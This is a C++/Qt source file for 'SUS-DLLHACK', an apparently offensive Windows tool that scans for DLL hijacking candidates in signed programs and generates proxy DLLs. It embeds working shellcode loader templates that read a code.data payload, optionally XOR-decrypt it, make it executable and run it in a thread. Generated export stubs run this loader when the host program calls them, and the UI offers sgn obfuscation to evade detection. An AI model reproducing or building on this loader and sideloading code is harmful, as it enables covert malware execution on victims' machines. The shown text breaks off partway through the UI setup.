#include "MainWindow.hpp"

#include "SgnLite.hpp"

#include <QApplication>
#include <QCheckBox>
#include <QComboBox>
#include <QCoreApplication>
#include <QDateTime>
#include <QDir>
#include <QDirIterator>
#include <QFileDialog>
#include <QFileInfo>
#include <QGridLayout>
#include <QGroupBox>
#include <QHeaderView>
#include <QHBoxLayout>
#include <QLabel>
#include <QLineEdit>
#include <QListWidget>
#include <QPainter>
#include <QProcess>
#include <QPushButton>
#include <QRegularExpression>
#include <QSet>
#include <QSplitter>
#include <QStackedWidget>
#include <QTextStream>
#include <QTime>
#include <QTimer>
#include <QVBoxLayout>

#include <algorithm>
#include <cstdint>
#include <utility>
#include <vector>

namespace {
class GridWidget : public QWidget {
public:
    explicit GridWidget(QWidget *parent = nullptr) : QWidget(parent) {}

protected:
    void paintEvent(QPaintEvent *event) override
    {
        QWidget::paintEvent(event);
        QPainter painter(this);
        painter.setPen(QColor(0, 255, 65, 18));
        constexpr int step = 28;
        for (int x = 0; x < width(); x += step) {
            painter.drawLine(x, 0, x, height());
        }
        for (int y = 0; y < height(); y += step) {
            painter.drawLine(0, y, width(), y);
        }
    }
};

QPushButton *browseButton()
{
    auto *button = new QPushButton("...");
    button->setFixedWidth(38);
    button->setToolTip(QStringLiteral("浏览"));
    return button;
}

QWidget *pathRow(QLineEdit *lineEdit, QPushButton *button)
{
    auto *row = new QWidget;
    auto *layout = new QHBoxLayout(row);
    layout->setContentsMargins(0, 0, 0, 0);
    layout->setSpacing(6);
    layout->addWidget(lineEdit, 1);
    layout->addWidget(button);
    return row;
}

QLabel *caption(const QString &text)
{
    auto *label = new QLabel(text);
    label->setStyleSheet("color:#7FFFD4;font-size:11px;");
    return label;
}

QString firstFileWithExtension(const QString &dirPath, const QString &extension)
{
    QDir dir(dirPath);
    const QFileInfoList files = dir.entryInfoList(QStringList{"*" + extension},
                                                  QDir::Files, QDir::Name);
    return files.isEmpty() ? QString() : files.first().absoluteFilePath();
}

QStringList dllsWithExports(const QString &dirPath)
{
    QStringList dlls;
    QDir dir(dirPath);
    const QFileInfoList files = dir.entryInfoList(QStringList{"*.dll"},
                                                  QDir::Files, QDir::Name);
    for (const QFileInfo &file : files) {
        if (file.completeBaseName().endsWith("_orig", Qt::CaseInsensitive)) {
            continue;
        }
        if (!PeExports::read(file.absoluteFilePath()).isEmpty()) {
            dlls << file.absoluteFilePath();
        }
    }
    return dlls;
}

QString firstDllNamedOrWithExports(const QString &dirPath, const QString &dllName)
{
    const QString named = QDir(dirPath).filePath(dllName);
    if (!dllName.isEmpty() && QFileInfo::exists(named)) {
        return named;
    }

    const QStringList dlls = dllsWithExports(dirPath);
    return dlls.isEmpty() ? QString() : dlls.first();
}

QString compactPath(const QString &path)
{
    const QFileInfo info(path);
    return info.fileName().isEmpty() ? path : info.fileName();
}

bool isAsciiIdentifier(const QString &value)
{
    if (value.isEmpty()) {
        return false;
    }

    const auto isLetter = [](QChar c) {
        const ushort v = c.unicode();
        return (v >= 'A' && v <= 'Z') || (v >= 'a' && v <= 'z');
    };
    const auto isDigit = [](QChar c) {
        const ushort v = c.unicode();
        return v >= '0' && v <= '9';
    };

    if (!isLetter(value.front()) && value.front() != QChar('_')) {
        return false;
    }
    for (qsizetype i = 1; i < value.size(); ++i) {
        if (!isLetter(value.at(i)) && !isDigit(value.at(i)) && value.at(i) != QChar('_')) {
            return false;
        }
    }
    return true;
}

QString escapeCppString(const QString &value)
{
    QString escaped;
    escaped.reserve(value.size() + 8);
    for (QChar ch : value) {
        switch (ch.unicode()) {
        case '\\':
            escaped += QStringLiteral("\\\\");
            break;
        case '"':
            escaped += QStringLiteral("\\\"");
            break;
        case '\n':
            escaped += QStringLiteral("\\n");
            break;
        case '\r':
            escaped += QStringLiteral("\\r");
            break;
        case '\t':
            escaped += QStringLiteral("\\t");
            break;
        default:
            escaped += ch;
            break;
        }
    }
    return escaped;
}

QString exportSourceName(const PeExportEntry &entry)
{
    return entry.undecoratedName.isEmpty() ? entry.decoratedName : entry.undecoratedName;
}

QString zeroEyeExportStub(const PeExportEntry &entry, int fallbackIndex)
{
    const QString name = exportSourceName(entry);
    if (name == QStringLiteral("DllMain") || entry.decoratedName == QStringLiteral("DllMain")) {
        return {};
    }

    if (name == QStringLiteral("DllCanUnloadNow")) {
        return QStringLiteral("//extern \"C\" __declspec(dllexport) HRESULT __stdcall DllCanUnloadNow(void) { return S_FALSE; }");
    }
    if (name == QStringLiteral("DllGetClassObject")) {
        return QStringLiteral("//extern \"C\" __declspec(dllexport) HRESULT __stdcall DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) { if (ppv) *ppv = nullptr; return CLASS_E_CLASSNOTAVAILABLE; }");
    }
    if (name == QStringLiteral("DllRegisterServer")) {
        return QStringLiteral("extern \"C\" __declspec(dllexport) HRESULT __stdcall DllRegisterServer(void) { return S_OK; }");
    }
    if (name == QStringLiteral("DllUnregisterServer")) {
        return QStringLiteral("extern \"C\" __declspec(dllexport) HRESULT __stdcall DllUnregisterServer(void) { return S_OK; }");
    }
    if (name == QStringLiteral("DllInstall")) {
        return QStringLiteral("extern \"C\" __declspec(dllexport) HRESULT __stdcall DllInstall(BOOL bInstall, LPCWSTR pszCmdLine) { return S_OK; }");
    }
    if (name == QStringLiteral("ServiceMain")) {
        return QStringLiteral("extern \"C\" __declspec(dllexport) void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) { }");
    }

    if (isAsciiIdentifier(name)) {
        return QStringLiteral("extern \"C\" __declspec(dllexport) int %1() { MessageBoxA(0, __FUNCTION__, 0, 0); return 0; }").arg(name);
    }

    const QString stubName = QStringLiteral("DllHackExportStub_%1").arg(fallbackIndex);
    QString output;
    output += QStringLiteral("#pragma comment(linker, \"/export:%1=%2\")\n")
                  .arg(escapeCppString(entry.decoratedName), stubName);
    output += QStringLiteral("extern \"C\" int %1() { MessageBoxA(0, \"%2\", 0, 0); return 0; }")
                  .arg(stubName, escapeCppString(entry.decoratedName));
    return output;
}

QString safeFileStem(QString value)
{
    value.replace(QRegularExpression(R"([^A-Za-z0-9_.-]+)"), "_");
    value = value.trimmed();
    if (value.isEmpty()) {
        value = QStringLiteral("proxy");
    }
    return value.left(80);
}

QString defaultTemplateSource()
{
    return QString::fromUtf8(R"cpp(#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int A() {
    FILE* fp = fopen("code.data", "rb");
    if (!fp) {
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t fileSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        fclose(fp);
        return 1;
    }

    fread(buffer, fileSize, 1, fp);
    fclose(fp);

    LPVOID execMem = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) {
        free(buffer);
        return 1;
    }

    memcpy(execMem, buffer, fileSize);
    free(buffer);

    DWORD oldProtect = 0;
    if (!VirtualProtect(execMem, fileSize, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(execMem, 0, MEM_RELEASE);
        return 1;
    }

    HANDLE hThread = CreateThread(
        NULL, 0,
        (LPTHREAD_START_ROUTINE)execMem,
        NULL, 0,
        NULL
    );

    if (!hThread) {
        VirtualFree(execMem, 0, MEM_RELEASE);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(execMem, 0, MEM_RELEASE);
    return 0;
}
)cpp");
}

QString xorTemplateSource()
{
    return QString::fromUtf8(R"cpp(#include <windows.h>
#include <stdio.h>

void XORDecrypt(BYTE* data, size_t size, BYTE key = 0x5A) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

BYTE* Read(LPCSTR filename, size_t* pSize) {
    HANDLE hFile = CreateFileA(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    *pSize = GetFileSize(hFile, NULL);
    BYTE* pData = (BYTE*)VirtualAlloc(NULL, *pSize, MEM_COMMIT, PAGE_READWRITE);

    DWORD bytesRead;
    ReadFile(hFile, pData, *pSize, &bytesRead, NULL);
    CloseHandle(hFile);

    return (*pSize == bytesRead) ? pData : NULL;
}

void Execute(BYTE* pDecrypted, size_t size) {
    LPVOID pExec = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(pExec, pDecrypted, size);
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExec, NULL, 0, NULL);
    if (hThread) WaitForSingleObject(hThread, INFINITE);
}

int A() {
    size_t size = 0;
    BYTE* pEncrypted = Read("code.data", &size);
    if (!pEncrypted || size == 0) {
        return 1;
    }

    XORDecrypt(pEncrypted, size);
    Execute(pEncrypted, size);

    VirtualFree(pEncrypted, 0, MEM_RELEASE);
    return 0;
}
)cpp");
}

quint8 parseXorKey(const QString &text, bool *ok)
{
    QString clean = text.trimmed();
    int base = 10;
    if (clean.startsWith(QStringLiteral("0x"), Qt::CaseInsensitive)) {
        clean = clean.mid(2);
        base = 16;
    }

    bool parsed = false;
    const uint value = clean.toUInt(&parsed, base);
    if (ok) {
        *ok = parsed && value <= 0xFF;
    }
    return static_cast<quint8>(value & 0xFF);
}

QString savedTemplatePath()
{
    return QDir(QCoreApplication::applicationDirPath()).filePath("templates/custom_A.cpp");
}

QString loadInitialTemplateSource()
{
    QFile file(savedTemplatePath());
    if (file.open(QIODevice::ReadOnly | QIODevice::Text)) {
        return QString::fromUtf8(file.readAll());
    }
    return defaultTemplateSource();
}

QString bundledMingwGccPath()
{
    const QString bundled = QDir(QCoreApplication::applicationDirPath())
        .filePath("tools/mingw64/bin/gcc.exe");
    if (QFileInfo::exists(bundled)) {
        return bundled;
    }
#ifdef DLLHACK_MINGW_ROOT
    const QString configured = QDir(QString::fromUtf8(DLLHACK_MINGW_ROOT)).filePath("bin/gcc.exe");
    if (QFileInfo::exists(configured)) {
        return configured;
    }
#endif
    const QString local = QStringLiteral("C:/Users/Yzy12/Desktop/test/MinGW64/bin/gcc.exe");
    if (QFileInfo::exists(local)) {
        return local;
    }
    return QStringLiteral("gcc.exe");
}

bool copyOverwrite(const QString &from, const QString &to)
{
    QDir().mkpath(QFileInfo(to).absolutePath());
    if (QFileInfo::exists(to)) {
        QFile::remove(to);
    }
    return QFile::copy(from, to);
}

bool copyDirectoryRecursively(const QString &from, const QString &to)
{
    QDir sourceDir(from);
    if (!sourceDir.exists()) {
        return false;
    }
    QDir().mkpath(to);

    const QFileInfoList entries = sourceDir.entryInfoList(QDir::NoDotAndDotDot | QDir::AllEntries);
    for (const QFileInfo &entry : entries) {
        const QString target = QDir(to).filePath(entry.fileName());
        if (entry.isDir()) {
            if (!copyDirectoryRecursively(entry.absoluteFilePath(), target)) {
                return false;
            }
        } else if (!copyOverwrite(entry.absoluteFilePath(), target)) {
            return false;
        }
    }
    return true;
}

QString bytesToCodeData(const QByteArray &bytes)
{
    QStringList lines;
    QString line;
    for (int i = 0; i < bytes.size(); ++i) {
        if (!line.isEmpty()) {
            line += QStringLiteral(", ");
        }
        line += QStringLiteral("0x%1")
                    .arg(static_cast<unsigned char>(bytes.at(i)), 2, 16, QChar('0'))
                    .toUpper();
        if ((i + 1) % 12 == 0) {
            lines << line;
            line.clear();
        }
    }
    if (!line.isEmpty()) {
        lines << line;
    }
    return lines.join(QStringLiteral(",\n"));
}

QString finalExportStub(const PeExportEntry &entry, const QSet<QString> &calledSet, int fallbackIndex)
{
    const QString name = exportSourceName(entry);
    if (name == QStringLiteral("DllMain") || entry.decoratedName == QStringLiteral("DllMain")) {
        return {};
    }

    const bool called = calledSet.contains(name) || calledSet.contains(entry.decoratedName);
    if (!called) {
        return zeroEyeExportStub(entry, fallbackIndex);
    }

    if (name == QStringLiteral("DllRegisterServer")) {
        return QStringLiteral("extern \"C\" __declspec(dllexport) HRESULT __stdcall DllRegisterServer(void) { A(); return S_OK; }");
    }
    if (name == QStringLiteral("DllUnregisterServer")) {
        return QStringLiteral("extern \"C\" __declspec(dllexport) HRESULT __stdcall DllUnregisterServer(void) { A(); return S_OK; }");
    }
    if (name == QStringLiteral("DllInstall")) {
        return QStringLiteral("extern \"C\" __declspec(dllexport) HRESULT __stdcall DllInstall(BOOL bInstall, LPCWSTR pszCmdLine) { A(); return S_OK; }");
    }
    if (name == QStringLiteral("ServiceMain")) {
        return QStringLiteral("extern \"C\" __declspec(dllexport) void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) { A(); }");
    }
    if (isAsciiIdentifier(name)) {
        return QStringLiteral("extern \"C\" __declspec(dllexport) int %1() { A(); return 0; }").arg(name);
    }

    const QString stubName = QStringLiteral("DllHackExportStub_%1").arg(fallbackIndex);
    QString output;
    output += QStringLiteral("#pragma comment(linker, \"/export:%1=%2\")\n")
                  .arg(escapeCppString(entry.decoratedName), stubName);
    output += QStringLiteral("extern \"C\" int %1() { A(); return 0; }").arg(stubName);
    return output;
}

QString defExportName(const QString &name)
{
    QString escaped = name;
    escaped.replace("\\", "\\\\");
    escaped.replace("\"", "\\\"");
    return "\"" + escaped + "\"";
}

QString finalBuildSymbol(int index)
{
    return QStringLiteral("DllHackFinalExport_%1").arg(index);
}

QString finalBuildSource(const QVector<PeExportEntry> &exports,
                         const QSet<QString> &calledSet,
                         bool xorEnabled,
                         quint8 xorKey)
{
    QStringList out;
    out << "typedef unsigned long long uintptr_t;";
    out << "typedef long long intptr_t;";
    out << "typedef void* HANDLE;";
    out << "typedef void* HMODULE;";
    out << "typedef void* LPVOID;";
    out << "typedef const void* LPCVOID;";
    out << "typedef const char* LPCSTR;";
    out << "typedef unsigned long DWORD;";
    out << "typedef unsigned long SIZE_T;";
    out << "typedef int BOOL;";
    out << "#define TRUE 1";
    out << "#define DLL_PROCESS_ATTACH 1";
    out << "#define GENERIC_READ 0x80000000UL";
    out << "#define FILE_SHARE_READ 0x00000001UL";
    out << "#define OPEN_EXISTING 3";
    out << "#define FILE_ATTRIBUTE_NORMAL 0x00000080UL";
    out << "#define INVALID_HANDLE_VALUE ((HANDLE)(intptr_t)-1)";
    out << "#define HEAP_ZERO_MEMORY 0x00000008UL";
    out << "#define MEM_COMMIT 0x00001000UL";
    out << "#define MEM_RESERVE 0x00002000UL";
    out << "#define MEM_RELEASE 0x00008000UL";
    out << "#define PAGE_READWRITE 0x04UL";
    out << "#define PAGE_EXECUTE_READ 0x20UL";
    out << "#define INFINITE 0xFFFFFFFFUL";
    out << "__declspec(dllimport) BOOL __stdcall DisableThreadLibraryCalls(HMODULE);";
    out << "__declspec(dllimport) HANDLE __stdcall CreateFileA(LPCSTR,DWORD,DWORD,LPVOID,DWORD,DWORD,HANDLE);";
    out << "__declspec(dllimport) DWORD __stdcall GetFileSize(HANDLE,DWORD*);";
    out << "__declspec(dllimport) BOOL __stdcall ReadFile(HANDLE,LPVOID,DWORD,DWORD*,LPVOID);";
    out << "__declspec(dllimport) BOOL __stdcall CloseHandle(HANDLE);";
    out << "__declspec(dllimport) HANDLE __stdcall GetProcessHeap(void);";
    out << "__declspec(dllimport) LPVOID __stdcall HeapAlloc(HANDLE,DWORD,SIZE_T);";
    out << "__declspec(dllimport) BOOL __stdcall HeapFree(HANDLE,DWORD,LPVOID);";
    out << "__declspec(dllimport) LPVOID __stdcall VirtualAlloc(LPVOID,SIZE_T,DWORD,DWORD);";
    out << "__declspec(dllimport) BOOL __stdcall VirtualProtect(LPVOID,SIZE_T,DWORD,DWORD*);";
    out << "__declspec(dllimport) BOOL __stdcall VirtualFree(LPVOID,SIZE_T,DWORD);";
    out << "__declspec(dllimport) HANDLE __stdcall CreateThread(LPVOID,SIZE_T,LPVOID,LPVOID,DWORD,DWORD*);";
    out << "__declspec(dllimport) DWORD __stdcall WaitForSingleObject(HANDLE,DWORD);";
    out << "";
    out << "static void DllHackCopy(unsigned char* dst, const unsigned char* src, SIZE_T size) {";
    out << "    SIZE_T i;";
    out << "    for (i = 0; i < size; ++i) dst[i] = src[i];";
    out << "}";
    out << "";
    out << "static void DllHackXor(unsigned char* data, SIZE_T size, unsigned char key) {";
    out << "    SIZE_T i;";
    out << "    for (i = 0; i < size; ++i) data[i] ^= key;";
    out << "}";
    out << "";
    out << "int A(void) {";
    out << "    HANDLE file = CreateFileA(\"code.data\", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);";
    out << "    if (file == INVALID_HANDLE_VALUE) return 1;";
    out << "    DWORD size = GetFileSize(file, 0);";
    out << "    if (!size || size == 0xFFFFFFFFUL) { CloseHandle(file); return 1; }";
    out << "    unsigned char* buffer = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, size);";
    out << "    if (!buffer) { CloseHandle(file); return 1; }";
    out << "    DWORD readBytes = 0;";
    out << "    if (!ReadFile(file, buffer, size, &readBytes, 0) || readBytes != size) {";
    out << "        CloseHandle(file);";
    out << "        HeapFree(GetProcessHeap(), 0, buffer);";
    out << "        return 1;";
    out << "    }";
    out << "    CloseHandle(file);";
    if (xorEnabled) {
        const QString keyLiteral = QStringLiteral("0x%1")
            .arg(static_cast<uint>(xorKey), 2, 16, QChar('0')).toUpper();
        out << QStringLiteral("    DllHackXor(buffer, size, %1);").arg(keyLiteral);
    }
    out << "    unsigned char* execMem = (unsigned char*)VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);";
    out << "    if (!execMem) { HeapFree(GetProcessHeap(), 0, buffer); return 1; }";
    out << "    DllHackCopy(execMem, buffer, size);";
    out << "    HeapFree(GetProcessHeap(), 0, buffer);";
    out << "    DWORD oldProtect = 0;";
    out << "    if (!VirtualProtect(execMem, size, PAGE_EXECUTE_READ, &oldProtect)) {";
    out << "        VirtualFree(execMem, 0, MEM_RELEASE);";
    out << "        return 1;";
    out << "    }";
    out << "    HANDLE thread = CreateThread(0, 0, (LPVOID)execMem, 0, 0, 0);";
    out << "    if (!thread) { VirtualFree(execMem, 0, MEM_RELEASE); return 1; }";
    out << "    WaitForSingleObject(thread, INFINITE);";
    out << "    CloseHandle(thread);";
    out << "    VirtualFree(execMem, 0, MEM_RELEASE);";
    out << "    return 0;";
    out << "}";
    out << "";

    for (int i = 0; i < exports.size(); ++i) {
        const PeExportEntry &entry = exports.at(i);
        const QString name = exportSourceName(entry);
        const bool called = calledSet.contains(name) || calledSet.contains(entry.decoratedName);
        out << QStringLiteral("int %1(void) {").arg(finalBuildSymbol(i));
        if (called) {
            out << "    A();";
        }
        out << "    return 0;";
        out << "}";
    }

    out << "";
    out << "BOOL __stdcall DllMain(HMODULE module, DWORD reason, LPVOID reserved) {";
    out << "    (void)reserved;";
    out << "    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(module);";
    out << "    return TRUE;";
    out << "}";
    return out.join('\n') + '\n';
}

QString finalDefSource(const QFileInfo &dllInfo, const QVector<PeExportEntry> &exports)
{
    QStringList out;
    out << QStringLiteral("LIBRARY \"%1\"").arg(dllInfo.fileName());
    out << "EXPORTS";
    for (int i = 0; i < exports.size(); ++i) {
        const PeExportEntry &entry = exports.at(i);
        out << QStringLiteral("    %1=%2 @%3")
            .arg(defExportName(entry.decoratedName), finalBuildSymbol(i))
            .arg(entry.ordinal);
    }
    return out.join('\n') + '\n';
}

bool runTool(const QString &program,
             const QStringList &args,
             const QString &workingDirectory,
             int timeoutMs,
             QString *combinedOutput)
{
    QProcess process;
    process.setProgram(program);
    process.setArguments(args);
    process.setWorkingDirectory(workingDirectory);
    process.start();
    if (!process.waitForStarted(5000)) {
        if (combinedOutput) {
            *combinedOutput = process.errorString();
        }
        return false;
    }
    if (!process.waitForFinished(timeoutMs)) {
        process.kill();
        process.waitForFinished(2000);
        if (combinedOutput) {
            *combinedOutput = QStringLiteral("进程超时");
        }
        return false;
    }
    if (combinedOutput) {
        *combinedOutput = QString::fromUtf8(process.readAllStandardOutput())
            + QString::fromUtf8(process.readAllStandardError());
    }
    return process.exitStatus() == QProcess::NormalExit && process.exitCode() == 0;
}
}

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
{
    m_templateSource = loadInitialTemplateSource();
    buildUi();
    connectSignals();
    setWindowTitle(QStringLiteral("SUS-DLLHACK - 作者 @X_Y"));
    appendEvent(QStringLiteral("就绪"), QStringLiteral("SUS-DLLHACK 已启动。扫描结果会自动进入批量劫持验证队列。"));
}

void MainWindow::buildUi()
{
    auto *root = new GridWidget;
    auto *rootLayout = new QVBoxLayout(root);
    rootLayout->setContentsMargins(12, 12, 12, 12);
    rootLayout->setSpacing(10);

    auto *mainSplitter = new QSplitter(Qt::Horizontal);
    rootLayout->addWidget(mainSplitter, 1);

    m_nav = new QListWidget;
    m_nav->setObjectName("NavBar");
    m_nav->addItems({QStringLiteral("扫描任务"), QStringLiteral("生成代理DLL"), QStringLiteral("关于")});
    m_nav->setCurrentRow(0);

    auto *navPanel = new QWidget;
    navPanel->setFixedWidth(178);
    auto *navLayout = new QVBoxLayout(navPanel);
    navLayout->setContentsMargins(0, 0, 0, 0);
    navLayout->setSpacing(10);
    navLayout->addWidget(m_nav, 1);
    mainSplitter->addWidget(navPanel);

    m_pages = new QStackedWidget;
    mainSplitter->addWidget(m_pages);

    auto *scanPage = new QWidget;
    auto *scanPageLayout = new QVBoxLayout(scanPage);
    scanPageLayout->setContentsMargins(0, 0, 0, 0);
    auto *scanSplitter = new QSplitter(Qt::Horizontal);
    scanPageLayout->addWidget(scanSplitter, 1);

    auto *centerPanel = new QWidget;
    auto *centerLayout = new QVBoxLayout(centerPanel);
    centerLayout->setSpacing(10);

    auto *scanBox = new QGroupBox(QStringLiteral("扫描任务"));
    auto *scanLayout = new QGridLayout(scanBox);
    scanLayout->setHorizontalSpacing(10);
    scanLayout->setVerticalSpacing(8);

    m_scanPath = new QLineEdit;
    m_scanPath->setPlaceholderText(QStringLiteral("选择需要扫描的目录"));
    m_inputFile = new QLineEdit;
    m_inputFile->setPlaceholderText(QStringLiteral("可选：单个 PE 文件分析"));
    m_moduleFile = new QLineEdit;
    m_moduleFile->setPlaceholderText(QStringLiteral("可选：生成模板的 PE 模块"));
    m_importFile = new QLineEdit;
    m_importFile->setPlaceholderText(QStringLiteral("可选：查看导入表的目标文件"));
    m_exportFile = new QLineEdit;
    m_exportFile->setPlaceholderText(QStringLiteral("可选：查看导出表的目标文件"));
    m_excludeList = new QLineEdit;
    m_excludeList->setPlaceholderText(QStringLiteral("需要忽略的 DLL 关键词，使用 | 分隔"));

    m_arch = new QComboBox;
    m_arch->addItems({QStringLiteral("任意架构"), "64", "86"});
    m_scanType = new QComboBox;
    m_scanType->addItems({"all", "gui", "cmd", "exe", "dotnet", "sys", "gui,dotnet"});
    m_signatureOnly = new QCheckBox(QStringLiteral("仅扫描签名文件"));
    m_excludeSystem = new QCheckBox(QStringLiteral("保留系统依赖候选"));
    m_autoValidate = new QCheckBox(QStringLiteral("扫描后自动批量验证"));
    m_autoValidate->setChecked(true);

    auto *scanBrowse = browseButton();
    auto *inputBrowse = browseButton();
    auto *moduleBrowse = browseButton();
    auto *importBrowse = browseButton();
    auto *exportBrowse = browseButton();
    m_runScanButton = new QPushButton(QStringLiteral("开始扫描"));
    m_stopScanButton = new QPushButton(QStringLiteral("停止扫描"));
    m_stopScanButton->setEnabled(false);
    auto *clearScanCache = new QPushButton(QStringLiteral("清除扫描缓存"));
    m_runScanButton->setToolTip(QStringLiteral("后台调用 ZeroEye 扫描核心，并生成结果队列"));
    m_stopScanButton->setToolTip(QStringLiteral("停止当前后台扫描任务"));
    clearScanCache->setToolTip(QStringLiteral("清理未验证成功的扫描白文件目录"));

    scanLayout->addWidget(caption(QStringLiteral("扫描目录")), 0, 0);
    scanLayout->addWidget(pathRow(m_scanPath, scanBrowse), 0, 1, 1, 5);
    scanLayout->addWidget(caption(QStringLiteral("扫描配置")), 1, 0);
    scanLayout->addWidget(m_scanType, 1, 1);
    scanLayout->addWidget(m_arch, 1, 2);
    scanLayout->addWidget(m_signatureOnly, 1, 3);
    scanLayout->addWidget(m_excludeSystem, 1, 4);
    scanLayout->addWidget(m_autoValidate, 1, 5);
    scanLayout->addWidget(caption(QStringLiteral("排除列表")), 2, 0);
    scanLayout->addWidget(m_excludeList, 2, 1, 1, 5);
    scanLayout->addWidget(caption(QStringLiteral("高级分析")), 3, 0);
    scanLayout->addWidget(pathRow(m_inputFile, inputBrowse), 3, 1, 1, 2);
    scanLayout->addWidget(pathRow(m_moduleFile, moduleBrowse), 3, 3, 1, 3);
    scanLayout->addWidget(caption(QStringLiteral("导入表目标")), 4, 0);
    scanLayout->addWidget(pathRow(m_importFile, importBrowse), 4, 1, 1, 5);
    scanLayout->addWidget(caption(QStringLiteral("导出表目标")), 5, 0);
    scanLayout->addWidget(pathRow(m_exportFile, exportBrowse), 5, 1, 1, 5);
    scanLayout->addWidget(clearScanCache, 6, 3);
    scanLayout->addWidget(m_stopScanButton, 6, 4);
    scanLayout->addWidget(m_runScanButton, 6, 5);
    centerLayout->addWidget(scanBox);

    auto *manualBox = new QGroupBox(QStringLiteral("手动验证"));
    auto *manualLayout = new QGridLayout(manualBox);
    m_hostExe = new QLineEdit;
    m_hostExe->setPlaceholderText(QStringLiteral("宿主 EXE"));
    m_proxyDll = new QLineEdit;
    m_proxyDll->setPlaceholderText(QStringLiteral("候选 DLL"));
    auto *hostBrowse = browseButton();
    auto *dllBrowse = browseButton();
    auto *loadExports = new QPushButton(QStringLiteral("读取导出"));
    auto *validate = new QPushButton(QStringLiteral("验证单项"));
    auto *batch = new QPushButton(QStringLiteral("验证队列"));
    manualLayout->addWidget(caption(QStringLiteral("宿主程序")), 0, 0);
    manualLayout->addWidget(pathRow(m_hostExe, hostBrowse), 0, 1, 1, 4);
    manualLayout->addWidget(caption(QStringLiteral("代理目标")), 1, 0);
    manualLayout->addWidget(pathRow(m_proxyDll, dllBrowse), 1, 1, 1, 4);
    manualLayout->addWidget(loadExports, 2, 2);
    manualLayout->addWidget(validate, 2, 3);
    manualLayout->addWidget(batch, 2, 4);
    centerLayout->addWidget(manualBox);

    m_results = new QTableWidget(0, 5);
    m_results->setHorizontalHeaderLabels({QStringLiteral("名称"), QStringLiteral("类型"),
                                          QStringLiteral("DLL 数量"), QStringLiteral("大小"),
                                          QStringLiteral("验证状态")});
    m_results->horizontalHeader()->setStretchLastSection(true);
    m_results->verticalHeader()->hide();
    m_results->setAlternatingRowColors(true);
    m_results->setSelectionBehavior(QAbstractItemView::SelectRows);
    centerLayout->addWidget(m_results, 1);
    scanSplitter->addWidget(centerPanel);

    auto *rightPanel = new QWidget;
    auto *rightLayout = new QVBoxLayout(rightPanel);
    auto *detailTitle = new QLabel(QStringLiteral("可用导出函数"));
    detailTitle->setStyleSheet("color:#00F0FF;font-weight:600;font-size:14px;");
    m_exports = new QListWidget;
    rightLayout->addWidget(detailTitle);
    rightLayout->addWidget(m_exports, 1);
    scanSplitter->addWidget(rightPanel);
    scanSplitter->setStretchFactor(0, 1);
    scanSplitter->setStretchFactor(1, 0);
    rightPanel->setMinimumWidth(380);
    m_pages->addWidget(scanPage);

    auto *generatorPage = new QWidget;
    auto *generatorPageLayout = new QVBoxLayout(generatorPage);
    generatorPageLayout->setContentsMargins(0, 0, 0, 0);
    auto *generatorBox = new QGroupBox(QStringLiteral("生成代理DLL"));
    auto *generatorLayout = new QGridLayout(generatorBox);
    m_generatorTarget = new QComboBox;
    m_generatorTarget->setPlaceholderText(QStringLiteral("等待验证成功的候选项"));
    m_templatePath = new QLineEdit;
    m_templatePath->setPlaceholderText(QStringLiteral("内置默认模板 A()"));
    m_templatePath->setText(savedTemplatePath());
    m_templatePreset = new QComboBox;
    m_templatePreset->addItems({QStringLiteral("默认模板：直接加载 code.data"),
                                QStringLiteral("默认模板：XOR 解密 code.data")});
    m_binPath = new QLineEdit;
    m_binPath->setPlaceholderText(QStringLiteral("可选：上传 bin，生成 code.data"));
    m_sgnObfuscate = new QCheckBox(QStringLiteral("启用 sgn 混淆"));
    m_sgnObfuscate->setChecked(true);
    m_xorEncrypt = new QCheckBox(QStringLiteral("启用 XOR 加密"));
    m_xorKey = new QLineEdit(QStringLiteral("0x5A"));
    m_xorKey->setPlaceholderText(QStringLiteral("XOR 密钥，如 0x5A"));
    m_xorKey->setMaximumWidth(120);
    m_templateEditor = new QPlainTextEdit;
    m_templateEditor->setObjectName("TemplateEditor");
    m_templateEditor->setPlainText(m_templateSource);
    m_templateEditor->setMinimumHeight(300);
    m_templateEditor->setPlaceholderText(QStringLiteral("模板中必须提供 int A() 或 void A() 函数"));
    auto *templateBrowse = new QPushButton(QStringLiteral("加载模板"));
    auto *templateSave = new QPushButton(QStringLiteral("保存模板"));
    auto *loadLog = new QPushButton(QStringLiteral("加载本地log"));
    auto *binBrowse = new QPushButton(QStringLiteral("上传bin文件"));
    auto *processPanel = new QWidget;
    processPanel->setObjectName("DataProcessPanel");
    auto *processLayout = new QHBoxLayout(processPanel);
    processLayout->setContentsMargins(10, 6, 10, 6);
    processLayout->setSpacing(14);
    auto *xorKeyLabel = new QLabel(QStringLiteral("密钥"));
    xorKeyLabel->setObjectName("InlineLabel");
    processLayout->addWidget(m_sgnObfuscate);
    processLayout->addWidget(m_xorEncrypt);
    processLayout->addWidget(xorKeyLabel);
    processLayout->addWidget(m_xorKey);
    processLayout->addStretch(1);
    auto *generateDll = new QPushButton(QStringLiteral("生成代理dll文件"));
    generateDll->setObjectName("GenerateButton");
    generateDll->setMinimumHeight(58);
    generateDll->setMinimumWidth(260);
